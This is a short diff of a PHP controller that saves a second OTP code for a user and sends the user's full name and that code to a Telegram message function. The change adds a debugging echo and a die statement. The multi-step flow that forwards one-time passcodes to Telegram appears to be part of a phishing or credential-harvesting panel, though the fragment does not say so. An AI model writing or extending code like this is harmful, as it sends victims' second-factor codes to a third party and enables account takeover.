@@ -100,7 +100,8 @@ class DataController extends Controller
                  Data::where('id', $recordId)->update($validated);
                 $record = Data::find($recordId);
             }
-            $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code_2: {$validated['otp_code_2']}");
+            echo $this->sendTelegramMessage("OTP code updated for user: {$record->full_name} otp_code_2: {$validated['otp_code_2']}");
+            die;
         }
 
         if ($currentStep == 7) {
